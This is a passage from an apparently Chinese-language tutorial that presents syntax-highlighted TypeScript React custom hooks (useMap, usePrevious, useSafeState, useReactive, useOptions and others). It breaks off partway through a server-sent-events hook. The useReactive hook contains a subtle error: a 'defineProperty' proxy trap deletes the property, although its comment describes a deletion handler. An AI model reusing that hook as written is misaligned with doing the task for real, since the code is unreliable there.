    <span class="hljs-keyword">const</span> <span class="hljs-title function_">remove</span> = (<span class="hljs-params">key: T</span>) =&gt; {
      <span class="hljs-keyword">const</span> newSet = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(sets)
      newSet.<span class="hljs-title function_">delete</span>(key)
      <span class="hljs-title function_">setSets</span>(newSet)
    }

    <span class="hljs-comment">// 清空数据</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">clear</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">const</span> newSet = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>&lt;T&gt;()
      <span class="hljs-title function_">setSets</span>(newSet)
    }

    <span class="hljs-comment">// 重置为默认值</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">reset</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-title function_">setSets</span>(defaultValue)
    }

    <span class="hljs-keyword">return</span> { add, set, remove, clear, reset }
  }, [defaultValue, sets])

  <span class="hljs-keyword">return</span> [sets, actions] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useSet
</code></pre>
<h3 data-id="heading-4">useMap</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { useMemo, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// 定义操作方法的接口</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Actions</span>&lt;T, U&gt; {
  <span class="hljs-attr">add</span>: <span class="hljs-function">(<span class="hljs-params">key: T, value: U</span>) =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// 新增一条数据</span>
  <span class="hljs-attr">get</span>: <span class="hljs-function">(<span class="hljs-params">key: T</span>) =&gt;</span> U | <span class="hljs-literal">undefined</span> <span class="hljs-comment">// 获取一条数据</span>
  <span class="hljs-attr">set</span>: <span class="hljs-function">(<span class="hljs-params">map: <span class="hljs-built_in">Map</span>&lt;T, U&gt;</span>) =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// 设置全部数据</span>
  <span class="hljs-attr">remove</span>: <span class="hljs-function">(<span class="hljs-params">key: T</span>) =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// 删除某条数据</span>
  <span class="hljs-attr">clear</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// 清空数据</span>
  <span class="hljs-attr">reset</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// 重置为默认值</span>
}

<span class="hljs-keyword">function</span> useMap&lt;T, U&gt;(
  <span class="hljs-attr">defaultValue</span>: <span class="hljs-title class_">Map</span>&lt;T, U&gt; = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(),
): [<span class="hljs-title class_">Map</span>&lt;T, U&gt;, <span class="hljs-title class_">Actions</span>&lt;T, U&gt;] {
  <span class="hljs-keyword">const</span> [map, setMap] = useState&lt;<span class="hljs-title class_">Map</span>&lt;T, U&gt;&gt;(defaultValue)

  <span class="hljs-comment">// 缓存操作方法避免重复创建</span>
  <span class="hljs-keyword">const</span> actions = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 新增数据</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">add</span> = (<span class="hljs-params">key: T, value: U</span>) =&gt; {
      <span class="hljs-keyword">const</span> newMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(map)
      newMap.<span class="hljs-title function_">set</span>(key, value)
      <span class="hljs-title function_">setMap</span>(newMap)
    }

    <span class="hljs-comment">// 获取数据</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">get</span> = (<span class="hljs-params">key: T</span>) =&gt; {
      <span class="hljs-keyword">return</span> map.<span class="hljs-title function_">get</span>(key)
    }

    <span class="hljs-comment">// 设置全部数据</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">set</span> = (<span class="hljs-params">map: <span class="hljs-built_in">Map</span>&lt;T, U&gt;</span>) =&gt; {
      <span class="hljs-title function_">setMap</span>(map)
    }

    <span class="hljs-comment">// 删除数据</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">remove</span> = (<span class="hljs-params">key: T</span>) =&gt; {
      <span class="hljs-keyword">const</span> newMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(map)
      newMap.<span class="hljs-title function_">delete</span>(key)
      <span class="hljs-title function_">setMap</span>(newMap)
    }

    <span class="hljs-comment">// 清空数据</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">clear</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">const</span> newMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(map)
      newMap.<span class="hljs-title function_">clear</span>()
      <span class="hljs-title function_">setMap</span>(newMap)
    }

    <span class="hljs-comment">// 重置为默认值</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">reset</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-title function_">setMap</span>(defaultValue)
    }

    <span class="hljs-keyword">return</span> { add, get, set, remove, clear, reset }
  }, [defaultValue, map])

  <span class="hljs-keyword">return</span> [map, actions] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useMap
</code></pre>
<h3 data-id="heading-5">usePrevious</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-keyword">type</span> <span class="hljs-title class_">ShouldUpdateFn</span>&lt;T&gt; = <span class="hljs-function">(<span class="hljs-params">prev: T | <span class="hljs-literal">undefined</span>, next: T</span>) =&gt;</span> <span class="hljs-built_in">boolean</span>
<span class="hljs-keyword">const</span> shouldUpdate = &lt;T&gt;<span class="hljs-function">(<span class="hljs-params">prev: T | <span class="hljs-literal">undefined</span>, next: T</span>) =&gt;</span> !<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">is</span>(prev, next)
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> usePrevious&lt;T&gt;(
  <span class="hljs-attr">state</span>: T,
  <span class="hljs-attr">shouldUp</span>: <span class="hljs-title class_">ShouldUpdateFn</span>&lt;T&gt; = shouldUpdate,
): T | <span class="hljs-literal">undefined</span> {
  <span class="hljs-keyword">const</span> curRef = useRef&lt;T&gt;() <span class="hljs-comment">// 当前值</span>
  <span class="hljs-keyword">const</span> preRef = useRef&lt;T&gt;() <span class="hljs-comment">// 上一个值</span>

  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">shouldUp</span>(curRef.<span class="hljs-property">current</span>, state)) {
    preRef.<span class="hljs-property">current</span> = curRef.<span class="hljs-property">current</span>
    curRef.<span class="hljs-property">current</span> = state
  }

  <span class="hljs-keyword">return</span> preRef.<span class="hljs-property">current</span>
}
</code></pre>
<h3 data-id="heading-6">useLatest</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">RefObject</span>, useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// 获取某个state的最新值的hook</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> useLatest&lt;S&gt;(<span class="hljs-attr">value</span>: S): <span class="hljs-title class_">RefObject</span>&lt;S&gt; {
  <span class="hljs-comment">// useRef 保存能保证每次获取到的都是最新的值</span>
  <span class="hljs-keyword">const</span> curRef = useRef&lt;S&gt;(value)
  curRef.<span class="hljs-property">current</span> = value

  <span class="hljs-keyword">return</span> curRef
}
</code></pre>
<h3 data-id="heading-7">useSafeState</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { useUnmount } <span class="hljs-keyword">from</span> <span class="hljs-string">'ahooks'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Dispatch</span>, <span class="hljs-title class_">SetStateAction</span>, useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// 主要是实现 setRafState 方法，在外部调用 setRafState 方法时，会取消上一次的 setState 回调函数，并执行 requestAnimationFrame 来控制 setState 的执行时机</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> useSafeState&lt;S&gt;(
  <span class="hljs-attr">initialState</span>: S | (<span class="hljs-function">() =&gt;</span> S),
): [S, <span class="hljs-title class_">Dispatch</span>&lt;<span class="hljs-title class_">SetStateAction</span>&lt;S&gt;&gt;] {
  <span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(initialState)
  <span class="hljs-keyword">const</span> reqId = <span class="hljs-title function_">useRef</span>(<span class="hljs-number">0</span>)
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">setSafeState</span> = (<span class="hljs-params">state: SetStateAction&lt;S&gt;</span>) =&gt; {
    <span class="hljs-title function_">cancelAnimationFrame</span>(reqId.<span class="hljs-property">current</span>)

    reqId.<span class="hljs-property">current</span> = <span class="hljs-title function_">requestAnimationFrame</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// 在回调执行真正的 setState</span>
      <span class="hljs-title function_">setState</span>(state)
    })
  }

  <span class="hljs-title function_">useUnmount</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">cancelAnimationFrame</span>(reqId.<span class="hljs-property">current</span>)
  })

  <span class="hljs-keyword">return</span> [state, setSafeState] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
}
</code></pre>
<h3 data-id="heading-8">useSetState</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { getTypeOf } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">SetStateAction</span>, useCallback, useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// 类似于以前的setState，有一个回调函数，回调函数的参数是最新的值</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> useSetState&lt;S&gt;(
  <span class="hljs-attr">initialState</span>: S | (<span class="hljs-function">() =&gt;</span> S),
): [S, <span class="hljs-function">(<span class="hljs-params">state: SetStateAction&lt;S&gt;, cb?: (state: S) =&gt; <span class="hljs-built_in">void</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>] {
  <span class="hljs-keyword">const</span> [state, set] = <span class="hljs-title function_">useState</span>(initialState)
  <span class="hljs-keyword">const</span> curRef = useRef&lt;S&gt;(state)
  curRef.<span class="hljs-property">current</span> = state

  <span class="hljs-keyword">const</span> setState = <span class="hljs-title function_">useCallback</span>(
    <span class="hljs-function">(<span class="hljs-params">state: SetStateAction&lt;S&gt;, cb?: (state: S) =&gt; <span class="hljs-built_in">void</span></span>) =&gt;</span> {
      <span class="hljs-title function_">set</span>(<span class="hljs-function">(<span class="hljs-params">pre</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> newState =
          <span class="hljs-title function_">getTypeOf</span>(state) === <span class="hljs-string">'Function'</span>
            ? (state <span class="hljs-keyword">as</span> (<span class="hljs-attr">preState</span>: S) =&gt; S)(pre)
            : (state <span class="hljs-keyword">as</span> S)
        curRef.<span class="hljs-property">current</span> = newState
        <span class="hljs-keyword">return</span> newState
      })
      cb?.(curRef.<span class="hljs-property">current</span>)
    },
    [],
  )

  <span class="hljs-keyword">return</span> [state, setState] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
}
</code></pre>
<h3 data-id="heading-9">useMergeStates</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { getTypeOf } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Dispatch</span>, <span class="hljs-title class_">SetStateAction</span>, useCallback, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// 合并state属性，使用的时候不用整体重新赋值</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> useMergeStates&lt;S <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;&gt;(
  <span class="hljs-attr">initialState</span>: S | (<span class="hljs-function">() =&gt;</span> S),
): [S, <span class="hljs-title class_">Dispatch</span>&lt;<span class="hljs-title class_">SetStateAction</span>&lt;<span class="hljs-title class_">Partial</span>&lt;S&gt;&gt;&gt;] {
  <span class="hljs-keyword">const</span> [state, set] = <span class="hljs-title function_">useState</span>(initialState)

  <span class="hljs-keyword">const</span> setState = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">(<span class="hljs-params">patch: SetStateAction&lt;Partial&lt;S&gt;&gt;</span>) =&gt;</span> {
    <span class="hljs-title function_">set</span>(<span class="hljs-function">(<span class="hljs-params">pre</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> newState =
        <span class="hljs-title function_">getTypeOf</span>(patch) === <span class="hljs-string">'Function'</span>
          ? (patch <span class="hljs-keyword">as</span> (<span class="hljs-attr">preState</span>: <span class="hljs-title class_">Partial</span>&lt;S&gt;) =&gt; S)(pre)
          : (patch <span class="hljs-keyword">as</span> S)

      <span class="hljs-keyword">return</span> newState ? { ...pre, ...newState } : pre
    })
  }, [])

  <span class="hljs-keyword">return</span> [state, setState] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
}
</code></pre>
<h3 data-id="heading-10">useGetState</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Dispatch</span>, <span class="hljs-title class_">SetStateAction</span>, useCallback, useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// 在useState的基础上增加获取方法</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> useGetState&lt;S&gt;(
  <span class="hljs-attr">initialState</span>: S | (<span class="hljs-function">() =&gt;</span> S),
): [S, <span class="hljs-title class_">Dispatch</span>&lt;<span class="hljs-title class_">SetStateAction</span>&lt;S&gt;&gt;, <span class="hljs-function">() =&gt;</span> S] {
  <span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(initialState)
  <span class="hljs-keyword">const</span> curRef = <span class="hljs-title function_">useRef</span>(state)
  curRef.<span class="hljs-property">current</span> = state

  <span class="hljs-keyword">const</span> getState = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> curRef.<span class="hljs-property">current</span>, [])

  <span class="hljs-keyword">return</span> [state, setState, getState] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
}
</code></pre>
<h3 data-id="heading-11">useReactive</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-keyword">import</span> useToggle <span class="hljs-keyword">from</span> <span class="hljs-string">'./useToggle'</span>

<span class="hljs-comment">// 响应式对象</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> useReactive&lt;S <span class="hljs-keyword">extends</span> <span class="hljs-built_in">object</span>&gt;(<span class="hljs-attr">initialState</span>: S): S {
  <span class="hljs-keyword">const</span> [, { toggle }] = <span class="hljs-title function_">useToggle</span>(<span class="hljs-literal">false</span>)
  <span class="hljs-keyword">const</span> curRef = <span class="hljs-title function_">useRef</span>(initialState)

  <span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(curRef.<span class="hljs-property">current</span>, {
    <span class="hljs-title function_">set</span>(<span class="hljs-params">target, key, value</span>) {
      <span class="hljs-keyword">const</span> ret = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, key, value)
      <span class="hljs-title function_">toggle</span>() <span class="hljs-comment">// 属性赋值时触发回调</span>
      <span class="hljs-keyword">return</span> ret
    },
    <span class="hljs-title function_">get</span>(<span class="hljs-params">target, key</span>) {
      <span class="hljs-keyword">const</span> ret = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, key)
      <span class="hljs-keyword">return</span> ret
    },
    <span class="hljs-title function_">defineProperty</span>(<span class="hljs-params">target, key</span>) {
      <span class="hljs-keyword">const</span> ret = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">deleteProperty</span>(target, key)
      <span class="hljs-title function_">toggle</span>() <span class="hljs-comment">// 属性删除时触发回调</span>
      <span class="hljs-keyword">return</span> ret
    },
  })

  <span class="hljs-keyword">return</span> proxy
}
</code></pre>
<h3 data-id="heading-12">useOptions</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">DefaultOptionType</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'antd/lib/select'</span>
<span class="hljs-keyword">import</span> { useEffect, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// 账号列表项</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">UseOptionsProps</span>&lt;T = <span class="hljs-title class_">DefaultOptionType</span>, R = <span class="hljs-built_in">any</span>&gt; = {
  labelField?: keyof R <span class="hljs-comment">// 要取的作为label的字段</span>
  labelFormat?: <span class="hljs-function">(<span class="hljs-params">record: R</span>) =&gt;</span> <span class="hljs-built_in">any</span> <span class="hljs-comment">// label字段自定义格式化函数</span>
  valueField?: keyof R <span class="hljs-comment">// 要取的作为value的字段</span>
  valueFormat?: <span class="hljs-function">(<span class="hljs-params">record: R</span>) =&gt;</span> <span class="hljs-built_in">any</span> <span class="hljs-comment">// value字段自定义格式化函数</span>
  resField?: <span class="hljs-built_in">string</span>[] <span class="hljs-comment">// 要取的返回值字段(比如res、list、resutl等)</span>
  <span class="hljs-attr">dataFn</span>: <span class="hljs-function">(<span class="hljs-params">...args: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">any</span>&gt; <span class="hljs-comment">// 要请求的接口</span>
  fnParams?: <span class="hljs-built_in">any</span> <span class="hljs-comment">// 请求的接口参数</span>
  definedFormat?: <span class="hljs-function">(<span class="hljs-params">data: R[]</span>) =&gt;</span> T[] <span class="hljs-comment">// 自定义格式化数据函数</span>
}

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@desc</span> 自定义获取任意接口并格式化为下拉options的hook
 * <span class="hljs-doctag">@param</span>  T 最终返回的数据的类型
 * <span class="hljs-doctag">@param</span>  R 接口返回的数据的类型
 */</span>
<span class="hljs-keyword">function</span> useOptions&lt;T = <span class="hljs-title class_">DefaultOptionType</span>, R = <span class="hljs-built_in">any</span>&gt;(
  <span class="hljs-attr">props</span>: <span class="hljs-title class_">UseOptionsProps</span>&lt;T, R&gt;,
): [T[], R[], <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>] {
  <span class="hljs-keyword">const</span> {
    labelField,
    valueField,
    labelFormat,
    valueFormat,
    fnParams,
    dataFn,
    resField,
    definedFormat,
  } = props || {}
  <span class="hljs-keyword">const</span> [options, setOptions] = useState&lt;T[]&gt;([]) <span class="hljs-comment">// 下拉选项</span>
  <span class="hljs-keyword">const</span> [datas, setDatas] = useState&lt;R[]&gt;([]) <span class="hljs-comment">// 原始数据</span>

  <span class="hljs-comment">/** 格式化为通用下拉选项结构 */</span>
  <span class="hljs-keyword">const</span> formatToCommonOptions = (<span class="hljs-attr">list</span>: R[]): T[] =&gt; {
    <span class="hljs-keyword">return</span> list?.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item: R</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> label = labelFormat
        ? labelFormat?.(item)
        : labelField
        ? item?.[labelField]
        : item?.[<span class="hljs-string">'name'</span> <span class="hljs-keyword">as</span> keyof R] || <span class="hljs-string">''</span> <span class="hljs-comment">// label取值</span>
      <span class="hljs-keyword">const</span> value = valueFormat
        ? valueFormat?.(item)
        : valueField
        ? item?.[valueField]
        : item?.[<span class="hljs-string">'id'</span> <span class="hljs-keyword">as</span> keyof R] || <span class="hljs-string">''</span> <span class="hljs-comment">// value取值</span>

      <span class="hljs-keyword">return</span> { label, value } <span class="hljs-keyword">as</span> T
    })
  }

  <span class="hljs-comment">// 获取数据</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDatas</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> res = fnParams ? <span class="hljs-keyword">await</span> <span class="hljs-title function_">dataFn</span>(fnParams) : <span class="hljs-keyword">await</span> <span class="hljs-title function_">dataFn</span>()

      <span class="hljs-keyword">const</span> <span class="hljs-attr">list</span>: R[] =
        resField &amp;&amp; resField?.<span class="hljs-property">length</span>
          ? resField.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">pre, cur</span>) =&gt;</span> pre?.[cur], res)
          : res
      <span class="hljs-keyword">if</span> (list &amp;&amp; <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(list)) {
        <span class="hljs-title function_">setDatas</span>(list) <span class="hljs-comment">// 保存原始数据</span>
        <span class="hljs-title function_">setOptions</span>(
          definedFormat ? <span class="hljs-title function_">definedFormat</span>(list) : <span class="hljs-title function_">formatToCommonOptions</span>(list),
        ) <span class="hljs-comment">// 保存格式化数据</span>
      }
    } <span class="hljs-keyword">catch</span> {
      <span class="hljs-comment">//</span>
    }
  }

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">getDatas</span>()
  }, [])

  <span class="hljs-keyword">return</span> [options, datas, getDatas]
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useOptions
</code></pre>
<h3 data-id="heading-13">useSse</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { useEffect, useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// 定时器的类型</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">TimerType</span> = <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-built_in">setTimeout</span>&gt; | <span class="hljs-literal">undefined</span>

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> SSE暴露的方法
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SSEMethods</span> {
  <span class="hljs-attr">close</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>
  <span class="hljs-attr">reconnect</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>
}

<span class="hljs-comment">/**
 * SSE连接状态枚举
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">SSEReadyState</span> {
  <span class="hljs-variable constant_">CONNECTING</span>, <span class="hljs-comment">// 连接中</span>
  <span class="hljs-variable constant_">OPEN</span>, <span class="hljs-comment">// 已连接</span>
  <span class="hljs-variable constant_">CLOSED</span>, <span class="hljs-comment">// 已关闭</span>
}

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> 初始化参数
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">EventSourceInit</span> = {
  withCredentials?: <span class="hljs-built_in">boolean</span>
  headers?: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;
  payload?: <span class="hljs-built_in">string</span>
}

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> SSE连接需要的参数
 * <span class="hljs-doctag">@param</span> T 当前SSE连接的数据结构
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SSEProps</span> {
  events?: <span class="hljs-built_in">string</span>[] <span class="hljs-comment">// 事件名称</span>
  retryInterval?: <span class="hljs-built_in">number</span> <span class="hljs-comment">// 重试间隔</span>
  heartbeatTimeout?: <span class="hljs-built_in">number</span> <span class="hljs-comment">// 心跳超时时间</span>
  init?: <span class="hljs-title class_">EventSourceInit</span> <span class="hljs-comment">// 初始化参数</span>
  onMessage?: <span class="hljs-function">(<span class="hljs-params">event: MessageEvent</span>) =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// 消息回调</span>
  autoConnect?: <span class="hljs-built_in">boolean</span> <span class="hljs-comment">// 是否自动连接</span>
  maxRetries?: <span class="hljs-built_in">number</span> <span class="hljs-comment">// 最大重试次数</span>
}

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> SSE连接返回结构
 * <span class="hljs-doctag">@param</span> T 当前SSE连接的数据结构
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SSEReturn</span>&lt;T&gt; {
  <span class="hljs-attr">data</span>: T | <span class="hljs-literal">null</span> <span class="hljs-comment">// 当前SSE连接的数据结构</span>
  <span class="hljs-attr">error</span>: <span class="hljs-title class_">Error</span> | <span class="hljs-literal">null</span> <span class="hljs-comment">// 错误</span>
  <span class="hljs-attr">readyState</span>: <span class="hljs-title class_">SSEReadyState</span> <span class="hljs-comment">// 连接状态</span>
  <span class="hljs-attr">methods</span>: <span class="hljs-title class_">SSEMethods</span> <span class="hljs-comment">// 暴露的方法</span>
  <span class="hljs-attr">retryCount</span>: <span class="hljs-built_in">number</span> <span class="hljs-comment">// 当前重试次数</span>
}

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> SSE连接状态枚举
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">READY_STATE_MAP</span> = {
  [<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CONNECTING</span>]: <span class="hljs-string">'连接中...'</span>,
  [<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">OPEN</span>]: <span class="hljs-string">'已连接'</span>,
  [<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CLOSED</span>]: <span class="hljs-string">'已关闭'</span>,
}

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> SSE连接状态枚举
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">READY_STATE_TYPE_MAP</span> = {
  [<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CONNECTING</span>]: <span class="hljs-string">'warning'</span>,
  [<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">OPEN</span>]: <span class="hljs-string">'success'</span>,
  [<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CLOSED</span>]: <span class="hljs-string">'error'</span>,
}

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> 通用的SSE连接HOOK
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">SSEProps</span>} 连接参数
 */</span>
<span class="hljs-comment">// 连接地址</span>
<span class="hljs-keyword">const</span> useSse = &lt;T,&gt;(<span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">options</span>: <span class="hljs-title class_">SSEProps</span>): <span class="hljs-title class_">SSEReturn</span>&lt;T&gt; =&gt; {
  <span class="hljs-keyword">const</span> {
    autoConnect,
    maxRetries,
    retryInterval = <span class="hljs-number">5</span> * <span class="hljs-number">1000</span>,
    heartbeatTimeout,
    init,
    events,
    onMessage,
  } = options || {}

  <span class="hljs-keyword">const</span> [readyState, setReadyState] = useState&lt;<span class="hljs-title class_">SSEReadyState</span>&gt;(
    <span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CONNECTING</span>,
  ) <span class="hljs-comment">// 当前连接状态</span>
  <span class="hljs-keyword">const</span> [data, setData] = useState&lt;T | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>) <span class="hljs-comment">// 当前SSE数据</span>
  <span class="hljs-keyword">const</span> [error, setError] = useState&lt;<span class="hljs-title class_">Error</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>) <span class="hljs-comment">// 错误</span>
  <span class="hljs-keyword">const</span> sseRef = useRef&lt;<span class="hljs-title class_">EventSource</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>) <span class="hljs-comment">// SSE实例</span>
  <span class="hljs-keyword">const</span> retryTimer = useRef&lt;<span class="hljs-title class_">TimerType</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>) <span class="hljs-comment">// 重试的定时器</span>
  <span class="hljs-keyword">const</span> heartbeatTimer = useRef&lt;<span class="hljs-title class_">TimerType</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>) <span class="hljs-comment">// 心跳的定时器</span>
  <span class="hljs-keyword">const</span> retryCount = useRef&lt;<span class="hljs-built_in">number</span>&gt;(<span class="hljs-number">0</span>) <span class="hljs-comment">// 当前重试次数</span>

  <span class="hljs-comment">// 初始化SSE</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">initSSE</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">try</span> {
